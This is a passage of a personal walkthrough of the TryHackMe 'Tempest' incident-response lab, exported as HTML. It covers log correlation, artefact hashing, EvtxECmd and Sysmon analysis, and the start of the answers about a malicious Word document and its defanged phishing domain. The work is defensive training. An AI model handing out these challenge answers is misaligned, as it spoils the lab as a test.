<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Tempest</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.page-description {
	margin-bottom: 2em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(50, 48, 44, 1);
}
.highlight-gray {
	color: rgba(115, 114, 110, 1);
	fill: rgba(115, 114, 110, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(205, 60, 58, 1);
	fill: rgba(205, 60, 58, 1);
}
.highlight-default_background {
	color: rgba(50, 48, 44, 1);
}
.highlight-gray_background {
	background: rgba(248, 248, 247, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(248, 243, 252, 1);
}
.highlight-pink_background {
	background: rgba(252, 241, 246, 1);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(115, 114, 110, 1);
	fill: rgba(115, 114, 110, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(205, 60, 58, 1);
	fill: rgba(205, 60, 58, 1);
}
.block-color-default_background {
	color: inherit;
	fill: inherit;
}
.block-color-gray_background {
	background: rgba(248, 248, 247, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(248, 243, 252, 1);
}
.block-color-pink_background {
	background: rgba(252, 241, 246, 1);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-default { background-color: rgba(84, 72, 49, 0.08); }
.select-value-color-gray { background-color: rgba(84, 72, 49, 0.15); }
.select-value-color-brown { background-color: rgba(210, 162, 141, 0.35); }
.select-value-color-orange { background-color: rgba(224, 124, 57, 0.27); }
.select-value-color-yellow { background-color: rgba(236, 191, 66, 0.39); }
.select-value-color-green { background-color: rgba(123, 183, 129, 0.27); }
.select-value-color-blue { background-color: rgba(93, 165, 206, 0.27); }
.select-value-color-purple { background-color: rgba(168, 129, 197, 0.27); }
.select-value-color-pink { background-color: rgba(225, 136, 179, 0.27); }
.select-value-color-red { background-color: rgba(244, 171, 159, 0.4); }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="2495b2cc-075b-808c-a469-d4128ecf8b3a" class="page sans"><header><div class="page-header-icon undefined"><img class="icon" src="https://tryhackme-images.s3.amazonaws.com/room-icons/ccd979ea52c4ba31ff75fd941a7c988e.png"/></div><h1 class="page-title"><strong>Tempest</strong></h1><p class="page-description"></p></header><div class="page-body"><p id="2495b2cc-075b-8086-b392-e66291744fd6" class="">This room aims to introduce the process of analysing endpoint and network logs from a compromised asset. Given the artefacts, we will aim to uncover the incident from the Tempest machine. In this scenario, you will be tasked to be one of the Incident Responders that will focus on handling and analysing the captured artefacts of a compromised machine.</p><p id="2495b2cc-075b-807e-914d-c1e30198e275" class="">
</p><h2 id="2495b2cc-075b-8048-9259-d8c2ef5a84ef" class="">Refresher</h2><h3 id="2495b2cc-075b-807d-8d3b-d4a5db973990" class="">Event Correlation</h3><p id="2495b2cc-075b-80d9-8d85-c3ee093fbdde" class="">Event correlation identifies significant relationships from multiple log sources, such as application logs, endpoint logs, and network logs.</p><p id="2495b2cc-075b-8089-8906-d2d2f6d75dca" class="">Event correlation deals with identifying significant artefacts co-existing from different log sources and connecting each related artefact. For example, a network connection log may exist in various log sources, such as Sysmon logs (Event ID 3: Network Connection) and Firewall logs. Firewall logs may provide the source and destination IP, source and destination port, protocol, and the action taken. In contrast, Sysmon logs may give the process that invoked the network connection and the user running the process.</p><p id="2495b2cc-075b-8006-9504-c07070bd00ae" class="">With this information, we can connect the dots of each artefact from the two data sources:</p><ul id="2495b2cc-075b-807d-a94c-c40046613723" class="bulleted-list"><li style="list-style-type:disc">Source and Destination IP</li></ul><ul id="2495b2cc-075b-80aa-9c61-c3ff71534a99" class="bulleted-list"><li style="list-style-type:disc">Source and Destination Port</li></ul><ul id="2495b2cc-075b-8061-8841-d900cf984d36" class="bulleted-list"><li style="list-style-type:disc">Action Taken</li></ul><ul id="2495b2cc-075b-80fc-a2ec-f45b21775e39" class="bulleted-list"><li style="list-style-type:disc">Protocol</li></ul><ul id="2495b2cc-075b-8056-8527-eeff061a3910" class="bulleted-list"><li style="list-style-type:disc">Process name</li></ul><ul id="2495b2cc-075b-8052-a4b3-c13478be565c" class="bulleted-list"><li style="list-style-type:disc">User Account</li></ul><ul id="2495b2cc-075b-8087-be80-df4111388e09" class="bulleted-list"><li style="list-style-type:disc">Machine Name</li></ul><p id="2495b2cc-075b-8068-8afd-c8a8195cc992" class="">
</p><h2 id="2495b2cc-075b-8012-939c-cbffbfcaf6e9" class="">Preparation - Tools and Artifacts</h2><p id="2495b2cc-075b-8041-9021-ea7a2fd95de5" class="">Compare by hash</p><p id="2495b2cc-075b-8028-ab09-fbe2144dcf89" class="">Before conducting the investigation, one of the most important steps is to compare the artefacts by their hashes. It is a common practice to verify if the artefacts are expected as it is.</p><p id="2495b2cc-075b-8029-a11c-f6a11e73dd7b" class="">
</p><p id="2495b2cc-075b-80b6-a052-f5da37d36f50" class="">In Powershell, </p><p id="2495b2cc-075b-80b3-945c-fd7ce32d24b4" class=""><code><strong>Get-FileHash -Algorithm SHA256 .\capture.pcapng</strong></code></p><figure id="2495b2cc-075b-800a-8376-dd6e2ea719d1" class="image"><a href="3492932A-F40A-4D49-BEFD-C83BFE084844.png"><img style="width:692px" src="3492932A-F40A-4D49-BEFD-C83BFE084844.png"/></a></figure><p id="2495b2cc-075b-807c-a895-f6f3d4b928cd" class="">
</p><p id="2495b2cc-075b-8088-9353-d7d434e36f91" class="">In Command Prompt</p><p id="2495b2cc-075b-8085-ae7c-e35a931d0b04" class=""><code>certutil.exe -hashfile &quot;C:\Users\Atrixi\Downloads\wegothacked.zip&quot; SHA256</code></p><figure id="2495b2cc-075b-808d-9b27-c2b26deb53bf" class="image"><a href="image%20310.png"><img style="width:692px" src="image%20310.png"/></a></figure><h3 id="2495b2cc-075b-802c-8015-ced585736048" class="">Toolset</h3><p id="2495b2cc-075b-8006-b3a9-cb005f41fbb4" class="">The toolset needed for this task is focused on analysing Sysmon Logs, Windows Event Logs, and Packet Capture.</p><p id="2495b2cc-075b-80c9-80bd-e69a2fcd37f9" class="">Endpoint Logs - To analyse Windows artefacts such as Windows Event Logs and Sysmon logs, we will use the following tools:</p><ul id="2495b2cc-075b-809a-bdb2-cc591a3e65d8" class="bulleted-list"><li style="list-style-type:disc">EvtxEcmd</li></ul><ul id="2495b2cc-075b-804a-a14a-cd589e3aabe8" class="bulleted-list"><li style="list-style-type:disc">Timeline Explorer</li></ul><ul id="2495b2cc-075b-8097-9c97-d99241b1c464" class="bulleted-list"><li style="list-style-type:disc">SysmonView</li></ul><ul id="2495b2cc-075b-8080-82ad-ebc42dfb0690" class="bulleted-list"><li style="list-style-type:disc">Event Viewer</li></ul><p id="2495b2cc-075b-8066-b006-c717b7235557" class="">Network Logs - To analyse the provided packet capture, we will use the following tools:</p><ul id="2495b2cc-075b-8076-8966-c788ccc0bec4" class="bulleted-list"><li style="list-style-type:disc">Wireshark</li></ul><ul id="2495b2cc-075b-8044-9f9e-e2e0e944304d" class="bulleted-list"><li style="list-style-type:disc">Brim</li></ul><p id="2495b2cc-075b-80bd-b900-f345889810c2" class="">
</p><p id="2495b2cc-075b-8089-a0fb-ecb504a2fa39" class="">To parse the provided logs, we need first to convert the EVTX logs into CSV using EvtxEcmd and then feed it into Timeline Explorer.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2495b2cc-075b-8054-a7e6-ed8d640f2594" class="code code-wrap"><code class="language-Objective-C" style="white-space:pre-wrap;word-break:break-all">PS C:\Tools&gt; .\EvtxECmd\EvtxECmd.exe -f &#x27;C:\Users\user\Desktop\Incident Files\sysmon.evtx&#x27; --csv &#x27;C:\Users\user\Desktop\Incident Files&#x27; --csvf sysmon.csv</code></pre><figure id="2495b2cc-075b-807a-aa1c-cdee76c18bd3" class="image"><a href="C32A7710-08CF-444C-B760-4F7348B10E77.png"><img style="width:692px" src="C32A7710-08CF-444C-B760-4F7348B10E77.png"/></a></figure><p id="2495b2cc-075b-802f-86cf-de6f2edd4447" class=""><br/>For TimelineExplorer.exe, we can load the exported CSV file by doing the following: <code>File &gt; Open &gt; Choose sysmon.csv from C:\Users\user\Desktop\Incident Files directory</code></p><figure id="2495b2cc-075b-8019-a7ff-cab6cb7f125a" class="image"><a href="4C9CA77D-11CE-49C8-A8EE-45AFCD26DA3A.png"><img style="width:2204px" src="4C9CA77D-11CE-49C8-A8EE-45AFCD26DA3A.png"/></a></figure><p id="2495b2cc-075b-808e-8486-e7badbee7938" class="">
</p><h3 id="2495b2cc-075b-8078-b9f4-f55b974eb3b7" class="">Sysmon View</h3><p id="2495b2cc-075b-8053-a79c-dbde2aa2abe9" class="">SysmonView is a Windows GUI-based tool that visualises Sysmon Logs. Before using this tool, we must export the log file&#x27;s contents into XML via <strong>Event Viewer</strong>.</p><p id="2495b2cc-075b-80b5-b12b-fd96c54e7412" class="">Usage:</p><ul id="2495b2cc-075b-80ec-88ed-e3eef2ccdc06" class="bulleted-list"><li style="list-style-type:disc">Go to <code>File &gt; Import Sysmon Event Logs</code> then choose the XML files generated using the Event Viewer.</li></ul><ul id="2495b2cc-075b-8073-98cb-f47f73d589fe" class="bulleted-list"><li style="list-style-type:disc">Once loaded, the left sidebar has search functionality that can filter a specific process in mind.</li></ul><ul id="2495b2cc-075b-8006-9c9a-d386caf6d22f" class="bulleted-list"><li style="list-style-type:disc">Choose the image path and session GUID to render the mapped view.</li></ul><figure id="2495b2cc-075b-8074-b5dd-ecaf49142f86" class="image"><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/d52dcf7d715bec56b7dbc7b9d60d1754.png"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/d52dcf7d715bec56b7dbc7b9d60d1754.png"/></a></figure><p id="2495b2cc-075b-80da-a900-d552de0ee1cc" class="">This tool can easily view the correlated events from a specific process. The example above summarises all Sysmon events related to <strong>explorer.exe.<br/></strong></p><p id="2495b2cc-075b-80d4-85c2-e60b819b44af" class="">Hashes of the files.</p><figure id="2495b2cc-075b-804b-8aed-e8942697a030" class="image"><a href="3CCF9520-E7B3-485A-82A1-4CB31C0F5161.png"><img style="width:692px" src="3CCF9520-E7B3-485A-82A1-4CB31C0F5161.png"/></a></figure><p id="2495b2cc-075b-801a-bdc4-c69d6f4997ee" class="">
</p><h2 id="2495b2cc-075b-80af-bdfc-df31e2c40676" class="">Initial Access - Malicious Document</h2><h3 id="2495b2cc-075b-801d-86b9-f57e5d2b6ab2" class="">Tempest Incident</h3><p id="2495b2cc-075b-8005-9097-d389bb997606" class="">In this incident, you will act as an Incident Responder from an alert triaged by one of your Security Operations Center analysts. The analyst has confirmed that the alert has a <strong>CRITICAL</strong> severity that needs further investigation.</p><p id="2495b2cc-075b-8019-a22b-fecc07a25be2" class="">As reported by the SOC analyst, the intrusion started from a malicious document. In addition, <br/>the analyst compiled the essential information generated by the alert as listed below:</p><ul id="2495b2cc-075b-804a-9173-dea40d49a880" class="bulleted-list"><li style="list-style-type:disc">The malicious document has a <strong>.doc</strong> extension.</li></ul><ul id="2495b2cc-075b-8059-8a54-f3626cf76224" class="bulleted-list"><li style="list-style-type:disc">The user downloaded the malicious document via <strong>chrome.exe</strong>.</li></ul><ul id="2495b2cc-075b-80db-bfc0-e1f069592b9e" class="bulleted-list"><li style="list-style-type:disc">The malicious document then executed a chain of commands to attain code execution.</li></ul><h1 id="2495b2cc-075b-80be-b337-f43048682ebd" class="">Investigation Guide</h1><p id="2495b2cc-075b-80d0-9d01-f01c6d78d346" class="">To aid with the investigation, you may refer to the cheatsheet crafted by the team applicable to this scenario:</p><ul id="2495b2cc-075b-805f-afeb-c33346d3559d" class="bulleted-list"><li style="list-style-type:disc">Start with the events generated by Sysmon.</li></ul><ul id="2495b2cc-075b-8045-89f0-d2528ccc24f7" class="bulleted-list"><li style="list-style-type:disc">EvtxEcmd, Timeline Explorer, and SysmonView can interpret Sysmon logs.</li></ul><ul id="2495b2cc-075b-801f-a6da-d63f829a2031" class="bulleted-list"><li style="list-style-type:disc">Follow the child processes of WinWord.exe.</li></ul><ul id="2495b2cc-075b-80b3-9268-cc0300eb3c9b" class="bulleted-list"><li style="list-style-type:disc">Use filters such as ParentProcessID or ProcessID to correlate the relationship of each process.</li></ul><ul id="2495b2cc-075b-805e-b478-d0465922032a" class="bulleted-list"><li style="list-style-type:disc">We can focus on Sysmon events such as Process Creation (Event ID 1) and DNS Queries (Event ID 22) to correlate the activity generated by the malicious document.</li></ul><p id="2495b2cc-075b-80f0-9c5c-f2a6c0b693e3" class="">Significant Data Sources:</p><ul id="2495b2cc-075b-8055-b248-cebddd29a8a3" class="bulleted-list"><li style="list-style-type:disc">Sysmon</li></ul><p id="2495b2cc-075b-8029-bb95-f35bd954b4e2" class="">
</p><p id="2495b2cc-075b-8025-a009-e12d744d5901" class="">
</p><h2 id="2495b2cc-075b-800d-82f6-cc13cf94b0fb" class="">Questions</h2><p id="2495b2cc-075b-800f-9ec1-c20b731f6bea" class="">
</p><ul id="2495b2cc-075b-80f1-b918-c266a2561efe" class="bulleted-list"><li style="list-style-type:disc">The user of this machine was compromised by a malicious document. What is the file name of the document?<br/><br/>I identified the name of the malicious document from the csv of the evtx using timeline explorer</li></ul><figure id="2495b2cc-075b-8041-98a5-f7af3c507e1e" class="image"><a href="2B08CDE9-1F6A-44ED-A9F1-B12FBCFFD4A7.png"><img style="width:691.9833374023438px" src="2B08CDE9-1F6A-44ED-A9F1-B12FBCFFD4A7.png"/></a></figure><p id="2495b2cc-075b-803c-9cb2-c5a9753c49ce" class="">
</p><ul id="2495b2cc-075b-8063-8212-f2cdb4721a9d" class="bulleted-list"><li style="list-style-type:disc">What is the name of the compromised user and machine?</li></ul><p id="2495b2cc-075b-80d6-9125-ded04b55cd87" class=""><em>Format: username-machine name<br/>from UserName, we can see the HOST and user</em></p><figure id="2495b2cc-075b-805b-ad09-edd21796ad4a" class="image"><a href="82465415-149C-4557-A0E7-846FCF805CDE.png"><img style="width:692px" src="82465415-149C-4557-A0E7-846FCF805CDE.png"/></a></figure><ul id="2495b2cc-075b-8057-9898-f0684df7de0e" class="bulleted-list"><li style="list-style-type:disc">What is the PID of the Microsoft Word process that opened the malicious document?<br/>I traced back from the target file where it was opened</li></ul><figure id="2495b2cc-075b-807a-b643-f6845222a64c" class="image"><a href="44C52C29-FFA1-481E-98B5-26F2A463A2BB.png"><img style="width:2191px" src="44C52C29-FFA1-481E-98B5-26F2A463A2BB.png"/></a></figure><ul id="2495b2cc-075b-8094-8e0e-d4a867f30ef0" class="bulleted-list"><li style="list-style-type:disc">Based on Sysmon logs, what is the IPv4 address resolved by the malicious domain used in the previous question?</li></ul><p id="2495b2cc-075b-801a-b54c-cdf7d23eae11" class="">I looked into Sysmon View to figure this out, I was able to find a DNS query from the winword.exe process, then I saw a DNS query for a domain <code>phishteam.x y z with an IP 167 714 199 191</code></p><ul id="2495b2cc-075b-802e-9d82-e62b1644197c" class="bulleted-list"><li style="list-style-type:disc">What is the base64 encoded string in the malicious payload executed by the document?</li></ul><p id="2495b2cc-075b-800e-ba3d-ce3c73edd827" class="">EveNT id =1, and we are also going by the PID 496, searching these 2, I found an executable </p><figure id="2495b2cc-075b-80eb-8b0e-f41e2fc305e3" class="image"><a 